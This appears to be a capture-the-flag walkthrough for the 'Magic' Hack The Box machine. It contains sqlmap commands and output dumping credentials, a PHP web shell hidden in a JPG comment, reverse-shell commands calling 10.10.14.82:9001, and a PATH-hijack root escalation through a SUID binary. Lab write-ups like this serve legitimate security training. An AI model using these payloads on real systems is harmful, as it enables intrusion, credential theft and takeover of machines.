sqlmap -u "http://magic.htb/" --crawl=2 --random-agent --batch --forms --threads=5 --level=5 --risk=3 --dbs

sqlmap -u "http://magic.htb/" --crawl=2 --random-agent --batch --forms --threads=5 --level=5 --risk=3 --tables

sqlmap -u "http://magic.htb/" --crawl=2 --random-agent --batch --forms --threads=5 --level=5 --risk=3 -D "Magic" -T "login" --dump

[10:10:07] [INFO] retrieving the length of query output
[10:10:07] [INFO] retrieved: 2
[10:10:10] [INFO] retrieved: id           
[10:10:10] [INFO] retrieving the length of query output
[10:10:10] [INFO] retrieved: 8
[10:10:14] [INFO] retrieved: username           
[10:10:14] [INFO] retrieving the length of query output
[10:10:14] [INFO] retrieved: 8
[10:10:18] [INFO] retrieved: password           
[10:10:18] [INFO] fetching entries for table 'login' in database 'Magic'
[10:10:18] [INFO] fetching number of entries for table 'login' in database 'Magic'
[10:10:18] [INFO] retrieved: 1
[10:10:19] [INFO] retrieving the length of query output
[10:10:19] [INFO] retrieved: 14
[10:10:25] [INFO] retrieved: Th3s3usW4sK1ng             
[10:10:25] [INFO] retrieving the length of query output
[10:10:25] [INFO] retrieved: 1
[10:10:25] [INFO] retrieved: 1
[10:10:26] [INFO] retrieving the length of query output
[10:10:26] [INFO] retrieved: 5
[10:10:29] [INFO] retrieved: admin 

exiftool -Comment='<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' lo2.jpg

upload image

browse to http://magic.htb/images/uploads/lo2.php.jpg?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.82/9001%200%3E%261%27

used thesesus as user and password Th3s3usW4sK1ng using `su - theseus`

theseus@ubuntu:~$ find / -perm -4000 2>/dev/null
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/snap/core18/2074/bin/mount
/snap/core18/2074/bin/ping
/snap/core18/2074/bin/su
/snap/core18/2074/bin/umount
/snap/core18/2074/usr/bin/chfn
/snap/core18/2074/usr/bin/chsh
/snap/core18/2074/usr/bin/gpasswd
/snap/core18/2074/usr/bin/newgrp
/snap/core18/2074/usr/bin/passwd
/snap/core18/2074/usr/bin/sudo
/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2074/usr/lib/openssh/ssh-keysign
/snap/core18/1668/bin/mount
/snap/core18/1668/bin/ping
/snap/core18/1668/bin/su
/snap/core18/1668/bin/umount
/snap/core18/1668/usr/bin/chfn
/snap/core18/1668/usr/bin/chsh
/snap/core18/1668/usr/bin/gpasswd
/snap/core18/1668/usr/bin/newgrp
/snap/core18/1668/usr/bin/passwd
/snap/core18/1668/usr/bin/sudo
/snap/core18/1668/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1668/usr/lib/openssh/ssh-keysign
/snap/core20/1026/usr/bin/chfn
/snap/core20/1026/usr/bin/chsh
/snap/core20/1026/usr/bin/gpasswd
/snap/core20/1026/usr/bin/mount
/snap/core20/1026/usr/bin/newgrp
/snap/core20/1026/usr/bin/passwd
/snap/core20/1026/usr/bin/su
/snap/core20/1026/usr/bin/sudo
/snap/core20/1026/usr/bin/umount
/snap/core20/1026/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1026/usr/lib/openssh/ssh-keysign
/snap/core/11316/bin/mount
/snap/core/11316/bin/ping
/snap/core/11316/bin/ping6
/snap/core/11316/bin/su
/snap/core/11316/bin/umount
/snap/core/11316/usr/bin/chfn
/snap/core/11316/usr/bin/chsh
/snap/core/11316/usr/bin/gpasswd
/snap/core/11316/usr/bin/newgrp
/snap/core/11316/usr/bin/passwd
/snap/core/11316/usr/bin/sudo
/snap/core/11316/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/11316/usr/lib/openssh/ssh-keysign
/snap/core/11316/usr/lib/snapd/snap-confine
/snap/core/11316/usr/sbin/pppd
/snap/core/8689/bin/mount
/snap/core/8689/bin/ping
/snap/core/8689/bin/ping6
/snap/core/8689/bin/su
/snap/core/8689/bin/umount
/snap/core/8689/usr/bin/chfn
/snap/core/8689/usr/bin/chsh
/snap/core/8689/usr/bin/gpasswd
/snap/core/8689/usr/bin/newgrp
/snap/core/8689/usr/bin/passwd
/snap/core/8689/usr/bin/sudo
/snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8689/usr/lib/openssh/ssh-keysign
/snap/core/8689/usr/lib/snapd/snap-confine
/snap/core/8689/usr/sbin/pppd
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping

suid for sysinfo was accessible by user.

is `ltrace sysinfo` we saw that `fdisk` was calling a relative path, which was open for a path attack:

```
====================Disk Info====================
)                              = 0x564a2dbc4020
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev(0x7fff3f883620, 0x564a2d9c2972, 0, 2880)                = 0x7fff3f883630
popen("fdisk -l", "r") <-- HERE                                                                                           = 0x564a2f029280
fgets(fdisk: cannot open /dev/loop0: Permission denied
fdisk: cannot open /dev/loop1: Permission denied
```

so we can set a file for `fdisk` in our path at say `/tmp/fdisk` and add to our path with `export PATH=/tmp:$PATH` and put a reverse shell into that `fdisk` file and run `sysinfo` gain root:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.82/9001 0>&1
```
